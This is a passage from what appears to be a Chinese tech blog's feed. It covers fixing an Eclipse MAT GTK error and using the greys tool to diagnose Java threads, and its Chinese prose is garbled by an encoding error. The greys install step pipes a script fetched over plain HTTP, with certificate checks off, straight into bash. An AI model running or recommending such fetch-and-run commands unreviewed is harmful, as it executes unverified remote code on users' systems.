at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:134)</span><br><span class="line">	at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:104)</span><br><span class="line">	at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:380)</span><br><span class="line">	at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:235)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">	at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:669)</span><br><span class="line">	at org.eclipse.equinox.launcher.Main.basicRun(Main.java:608)</span><br><span class="line">	at org.eclipse.equinox.launcher.Main.run(Main.java:1515)</span><br><span class="line">	at org.eclipse.equinox.launcher.Main.main(Main.java:1488)</span><br><span class="line">Caused by: org.eclipse.swt.SWTError: No more handles [Browser style SWT.MOZILLA and Java system property org.eclipse.swt.browser.DefaultType=mozilla are not supported with GTK 3 as XULRunner is not ported for GTK 3 yet]</span><br><span class="line">	at org.eclipse.swt.SWT.error(SWT.java:4517)</span><br><span class="line">	at org.eclipse.swt.browser.MozillaDelegate.&lt;init&gt;(MozillaDelegate.java:57)</span><br><span class="line">	at org.eclipse.swt.browser.Mozilla.create(Mozilla.java:663)</span><br><span class="line">	at org.eclipse.swt.browser.Browser.&lt;init&gt;(Browser.java:99)</span><br><span class="line">	at org.eclipse.mat.ui.internal.panes.QueryTextResultPane.createPartControl(QueryTextResultPane.java:72)</span><br><span class="line">	at org.eclipse.mat.ui.editor.MultiPaneEditor.addPage(MultiPaneEditor.java:585)</span><br><span class="line">	at org.eclipse.mat.ui.editor.MultiPaneEditor.addPage(MultiPaneEditor.java:574)</span><br><span class="line">	at org.eclipse.mat.ui.editor.MultiPaneEditor.addNewPage(MultiPaneEditor.java:496)</span><br><span class="line">	at org.eclipse.mat.ui.QueryExecution.doDisplayResult(QueryExecution.java:300)</span><br><span class="line">	at org.eclipse.mat.ui.QueryExecution.access$0(QueryExecution.java:240)</span><br><span class="line">	at org.eclipse.mat.ui.QueryExecution$1.run(QueryExecution.java:144)</span><br><span class="line">	at org.eclipse.swt.widgets.RunnableLock.run(RunnableLock.java:35)</span><br><span class="line">	at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:135)</span><br><span class="line">	... 24 more</span><br></pre></td></tr></table></figure>
<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>è¿™ä¸ªæ˜¯<code>gtk</code>çš„é—®é¢˜ã€‚</p>
<p>æ·»åŠ <code>--launcher.GTK_version</code>å’Œ<code>2</code>åˆ°<code>MemoryAnalyzer.ini</code>æ–‡ä»¶ä¸­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-startup</span><br><span class="line">plugins/org.eclipse.equinox.launcher_1.3.100.v20150511-1540.jar</span><br><span class="line">--launcher.library</span><br><span class="line">plugins/org.eclipse.equinox.launcher.gtk.linux.x86_64_1.1.300.v20150602-1417</span><br><span class="line">--launcher.GTK_version</span><br><span class="line">2</span><br><span class="line">-vmargs</span><br><span class="line">-Xmx1024m</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="https://askubuntu.com/questions/761604/eclipse-not-working-in-16-04" rel="external nofollow noopener noreferrer" target="_blank">Eclipse not working in 16.04 - Ask Ubuntu</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä½¿ç”¨greysæ¥æ’æŸ¥çº¿ä¸Šé—®é¢˜]]></title>
      <url>http://qsli.github.io/2017/11/12/greys/</url>
      <content type="html"><![CDATA[<h2 id="greys"><a href="#greys" class="headerlink" title="greys"></a>greys</h2><p>greysçš„ç†å¿µæ˜¯å°†btraceå¸¸ç”¨çš„åŠŸèƒ½å‘½ä»¤åŒ–ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§çš„èŠ‚çœæ’æŸ¥é—®é¢˜çš„æ—¶é—´ã€‚</p>
<h3 id="greys-å®‰è£…"><a href="#greys-å®‰è£…" class="headerlink" title="greys å®‰è£…"></a>greys å®‰è£…</h3><p>æ¨èä½¿ç”¨ç½‘ç»œå®‰è£…:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sLk http://ompc.oss.aliyuncs.com/greys/install.sh|bash</span><br></pre></td></tr></table></figure>
<p>å®‰è£…åå®¶ç›®å½•ä¸‹æœ‰å¦‚ä¸‹çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/home/qishengli/.greys</span><br><span class="line">â””â”€â”€ lib</span><br><span class="line">    â””â”€â”€ 1.7.6.4</span><br><span class="line">        â”œâ”€â”€ greys</span><br><span class="line">        â”‚Â Â  â”œâ”€â”€ ga.sh</span><br><span class="line">        â”‚Â Â  â”œâ”€â”€ greys-agent.jar</span><br><span class="line">        â”‚Â Â  â”œâ”€â”€ greys-core.jar</span><br><span class="line">        â”‚Â Â  â”œâ”€â”€ greys.sh</span><br><span class="line">        â”‚Â Â  â”œâ”€â”€ gs.sh</span><br><span class="line">        â”‚Â Â  â””â”€â”€ install-local.sh</span><br><span class="line">        â””â”€â”€ greys-1.7.6.4-bin.zip</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å…¶ä¸­greys-core.jarä¸ºgreysçš„ç¨‹åºä¸»ä½“ï¼Œå¯åŠ¨ç±»ã€åŠ è½½ç±»éƒ½åœ¨è¿™ä¸ªjaråŒ…å½“ä¸­ï¼›<br>greys-agent.jaråˆ™ä¸ºç›®æ ‡JVMçš„åŠ è½½å¼•å¯¼ç¨‹åºï¼›<br>greys.shä¸ºä¸€ä¸ªå¯æ‰§è¡Œè„šæœ¬ï¼Œä¸ºGreysçš„å¯åŠ¨è„šæœ¬ã€‚</p>
</blockquote>
<h3 id="greyså¸¸ç”¨åŠŸèƒ½"><a href="#greyså¸¸ç”¨åŠŸèƒ½" class="headerlink" title="greyså¸¸ç”¨åŠŸèƒ½"></a>greyså¸¸ç”¨åŠŸèƒ½</h3><p>å¯åŠ¨è„šæœ¬ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat -H ./greys.sh  3292</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œä¸€èˆ¬ä¼šé™åˆ¶tomcatå¯åŠ¨ç”¨æˆ·çš„æƒé™ï¼Œè¿™é‡Œ<code>-u</code>æŒ‡å®šäº†<code>tomcat</code>å¯åŠ¨çš„ç”¨æˆ·ï¼Œ <code>3292</code>æ˜¯tomcatçš„è¿›ç¨‹idã€‚<br>äº¤äº’å¼shellï¼Œè¾“å…¥helpå³å¯çœ‹åˆ°æ‰€æœ‰æ”¯æŒçš„å‘½ä»¤ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;help</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       sc | Search all the classes loaded by JVM                                             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       sm | Search the method of classes loaded by JVM                                       |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  monitor | Monitor the execution of specified Class and its method                          |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    watch | Display the details of specified class and method                                |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       tt | Time Tunnel                                                                      |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    trace | Display the detailed thread stack of specified class and method                  |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|       js | Enhanced JavaScript                                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|   ptrace | Display the detailed thread path stack of specified class and method             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    stack | Display the stack trace of specified class and method                            |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|     quit | Quit Greys console                                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  session | Display current session information                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|  version | Display Greys version                                                            |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      jvm | Display the target JVM information                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|    reset | Reset all the enhanced classes                                                   |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      asm | Display class bytecode by asm format                                             |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">| shutdown | Shut down Greys server and exit the console                                      |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|     help | Display Greys Help                                                               |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br><span class="line">|      top | Display The Threads Of Top CPU TIME                                              |</span><br><span class="line">+----------+----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>helpåé¢å¯ä»¥è·Ÿå…·ä½“çš„å‘½ä»¤ï¼Œ ä¼šæ˜¾ç¤ºå‘½ä»¤çš„å…·ä½“ç”¨æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;help tt</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">|   USAGE | -[tlDi:x:w:s:pdEn:] class-pattern method-pattern condition-express               |</span><br><span class="line">|         | Time Tunnel                                                                      |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">| OPTIONS |              [t] | Record the method invocation within time fragments            |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [l] | List all the time fragments                                   |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [D] | Delete all the time fragments                                 |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [i:] | Display the detailed information from specified time fragmen  |</span><br><span class="line">|         |                  | t                                                             |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [x:] | Expand level of object (0 by default)                         |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [w:] | watch-express, watch the time fragment by OGNL express, like  |</span><br><span class="line">|         |                  |  params[0], returnObj, throwExp and so on.                    |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |     params[0]                                                 |</span><br><span class="line">|         |                  |     params[0]+params[1]                                       |</span><br><span class="line">|         |                  |     returnObj                                                 |</span><br><span class="line">|         |                  |     throwExp                                                  |</span><br><span class="line">|         |                  |     target                                                    |</span><br><span class="line">|         |                  |     clazz                                                     |</span><br><span class="line">|         |                  |     method                                                    |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [s:] | Search-expression, to search the time fragments by OGNL expr  |</span><br><span class="line">|         |                  | ess                                                           |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |      TRUE : 1==1                                              |</span><br><span class="line">|         |                  |      TRUE : true                                              |</span><br><span class="line">|         |                  |     FALSE : false                                             |</span><br><span class="line">|         |                  |      TRUE : params.length&gt;=0                                  |</span><br><span class="line">|         |                  |     FALSE : 1==2                                              |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         |                  |           #index : the index of time-fragment record          |</span><br><span class="line">|         |                  |       #processId : the process ID of time-fragment record     |</span><br><span class="line">|         |                  |            #cost : the cost time of time-fragment record      |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [p] | Replay the time fragment specified by index                   |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [d] | Delete time fragment specified by index                       |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |              [E] | Enable regular expression to match (wildcard matching by def  |</span><br><span class="line">|         |                  | ault)                                                         |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |             [n:] | Threshold of execution times                                  |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |    class-pattern | Path and classname of Pattern Matching                        |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |   method-pattern | Method of Pattern Matching                                    |</span><br><span class="line">|         | -----------------+-------------------------------------------------------------- |</span><br><span class="line">|         |  condition-expre | Conditional expression by OGNL                                |</span><br><span class="line">|         |               ss |                                                               |</span><br><span class="line">|         |                  | FOR EXAMPLE                                                   |</span><br><span class="line">|         |                  |      TRUE : 1==1                                              |</span><br><span class="line">|         |                  |      TRUE : true                                              |</span><br><span class="line">|         |                  |     FALSE : false                                             |</span><br><span class="line">|         |                  |      TRUE : params.length&gt;=0                                  |</span><br><span class="line">|         |                  |     FALSE : 1==2                                              |</span><br><span class="line">|         |                  |                                                               |</span><br><span class="line">|         |                  | THE STRUCTURE                                                 |</span><br><span class="line">|         |                  |           target : the object                                 |</span><br><span class="line">|         |                  |            clazz : the object&apos;s class                         |</span><br><span class="line">|         |                  |           method : the constructor or method                  |</span><br><span class="line">|         |                  |     params[0..n] : the parameters of method                   |</span><br><span class="line">|         |                  |        returnObj : the returned object of method              |</span><br><span class="line">|         |                  |         throwExp : the throw exception of method              |</span><br><span class="line">|         |                  |         isReturn : the method ended by return                 |</span><br><span class="line">|         |                  |          isThrow : the method ended by throwing exception     |</span><br><span class="line">|         |                  |            #cost : the cost(ms) of method                     |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br><span class="line">| EXAMPLE | tt -t *StringUtils isTop                                                         |</span><br><span class="line">|         | tt -t *StringUtils isTop params[0].length==1                                     |</span><br><span class="line">|         | tt -l                                                                            |</span><br><span class="line">|         | tt -D                                                                            |</span><br><span class="line">|         | tt -i 1000 -w params[0]                                                          |</span><br><span class="line">|         | tt -i 1000 -d                                                                    |</span><br><span class="line">|         | tt -i 1000                                                                       |</span><br><span class="line">+---------+----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><p>greysçš„shellé‡Œé›†æˆçš„topåŠŸèƒ½ï¼Œå¯ä»¥æ˜¾ç¤ºjstackä¸­æ¯ä¸ªçº¿ç¨‹çš„cpuå æ¯”ã€‚</p>
<p>æ²¡æœ‰greysçš„æ—¶å€™çš„åšæ³•å¯èƒ½æ˜¯ï¼Œå…ˆæŸ¥çœ‹nativeçš„çº¿ç¨‹çš„cpuå ç”¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -p 3292 -H</span><br></pre></td></tr></table></figure>
<p><code>-H</code>æ˜¯æ˜¾ç¤ºåˆ°çº¿ç¨‹çº§åˆ«</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Tasks: 699 total,   0 running, 699 sleeping,   0 stopped,   0 zombie</span><br><span class="line">Cpu(s):  8.0%us,  1.6%sy,  0.0%ni, 90.2%id,  0.0%wa,  0.0%hi,  0.2%si,  0.1%st</span><br><span class="line">Mem:   8059648k total,  7801008k used,   258640k free,    33328k buffers</span><br><span class="line">Swap:  4194296k total,        0k used,  4194296k free,  2453588k cached</span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                            </span><br><span class="line"> 5620 tomcat    20   0 9446m 4.2g 6696 S  6.6 54.2  33:46.86 java                                                                               </span><br><span class="line"> 5764 tomcat    20   0 9446m 4.2g 6696 S  5.0 54.2   1:05.94 java                                                                               </span><br><span class="line"> 5787 tomcat    20   0 9446m 4.2g 6696 S  4.0 54.2  57:48.76 java                                                                               </span><br><span class="line"> 5790 tomcat    20   0 9446m 4.2g 6696 S  2.3 54.2  40:31.71 java                                                                               </span><br><span class="line"> 3523 tomcat    20   0 9446m 4.2g 6696 S  1.3 54.2  68:48.18 java                                                                               </span><br><span class="line"> 3982 tomcat    20   0 9446m 4.2g 6696 S  1.3 54.2  21:15.22 java                                                                               </span><br><span class="line"> 3385 tomcat    20   0 9446m 4.2g 6696 S  1.0 54.2  54:10.76 java                                                                               </span><br><span class="line"> 3413 tomcat    20   0 9446m 4.2g 6696 S  1.0 54.2  29:12.64 java</span><br></pre></td></tr></table></figure>
<p>ç”±äºjstackçš„è¾“å‡ºæ˜¯16è¿›åˆ¶çš„çº¿ç¨‹å·ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®<code>PID</code>è¿›è¡Œè½¬æ¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf &quot;%x\n&quot; 5620</span><br><span class="line">15f4</span><br></pre></td></tr></table></figure>
<p>ç„¶å<code>jstack</code>å»æŸ¥æ‰¾ç›¸åº”çš„javaçº¿ç¨‹æ ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;http-8080-38&quot; daemon prio=10 tid=0x00007fbcf006e000 nid=0x15f4 in Object.wait() [0x00007fbcd28a1000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">        at java.lang.Object.wait(Native Method)</span><br><span class="line">        - waiting on &lt;0x000000077b69e488&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at java.lang.Object.wait(Object.java:503)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)</span><br><span class="line">        - locked &lt;0x000000077b69e488&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure>
<p>è´¹äº†ä¸€ç•ªåŠŸå¤«ï¼Œé»„èŠ±èœéƒ½å‡‰äº†ã€‚</p>
<p>ä¹Ÿæœ‰å°†ä¸Šé¢çš„æ­¥éª¤å†™æˆä¸€ä¸ªè„šæœ¬çš„ï¼Œå¿«äº†è®¸å¤šã€‚ï¼ˆé©¼å‚å†…éƒ¨æ•£è½ç€å„ç§ä¸åŒç‰ˆæœ¬çš„slow_stack.shï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">The stack of busy(13.6%) thread(3613/0xe1d) of java pid(3292) all times():</span><br><span class="line">&quot;http-8080-13&quot; daemon prio=10 tid=0x00007fbcf001b000 nid=0xe1d in Object.wait() [0x00007fbce7f7e000]</span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)</span><br><span class="line">        at java.lang.Object.wait(Native Method)</span><br><span class="line">        - waiting on &lt;0x0000000771e29738&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at java.lang.Object.wait(Object.java:503)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)</span><br><span class="line">        - locked &lt;0x0000000771e29738&gt; (a org.apache.tomcat.util.net.JIoEndpoint$Worker)</span><br><span class="line">        at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:744)</span><br></pre></td></tr></table></figure>
<p>å¼€æºçš„ç‰ˆæœ¬ä¹Ÿæœ‰ï¼Œ <a href="https://github.com/superhj1987/awesome-scripts/blob/master/docs/java.md#beer-show-busy-java-threads" rel="external nofollow noopener noreferrer" target="_blank">awesome-scripts/java.md at master Â· superhj1987/awesome-scripts</a></p>
<p>greysä¸­å°±å¯ä»¥ç›´æ¥ä½¿ç”¨topå‘½ä»¤æ¥æŸ¥çœ‹ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;top -t 3 -d</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| ID    |  CPU%  | USR%          | STATE                | THREAD_NAME                                                                           |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #131  | 04.14% | TIMED_WAITING | CachedClock Updater  | at : sun.misc.Unsafe.park(Native Method)                                              |</span><br><span class="line">|       |        |               | Thread               | at : java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:349)           |</span><br><span class="line">|       |        |               |                      | at : qunar.tc.common.clock.CachedClock$1.run(CachedClock.java:22)                     |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #1282 | 03.51% | WAITING       | http-8080-176        | at : java.lang.Object.wait(Native Method)                                             |</span><br><span class="line">|       |        |               |                      | at : java.lang.Object.wait(Object.java:503)                                           |</span><br><span class="line">|       |        |               |                      | at : org.apache.tomcat.util.net.JIoEndpoint$Worker.await(JIoEndpoint.java:458)        |</span><br><span class="line">|       |        |               |                      | at : org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:484)          |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br><span class="line">| #38   | 03.26% | TIMED_WAITING | thread-monitor-task  | at : sun.misc.Unsafe.park(Native Method)                                              |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226)           |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos |</span><br><span class="line">|       |        |               |                      |      (AbstractQueuedSynchronizer.java:2082)                                           |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(Scheduled |</span><br><span class="line">|       |        |               |                      |      ThreadPoolExecutor.java:1090)                                                    |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(Scheduled |</span><br><span class="line">|       |        |               |                      |      ThreadPoolExecutor.java:807)                                                     |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068)    |</span><br><span class="line">|       |        |               |                      | at : 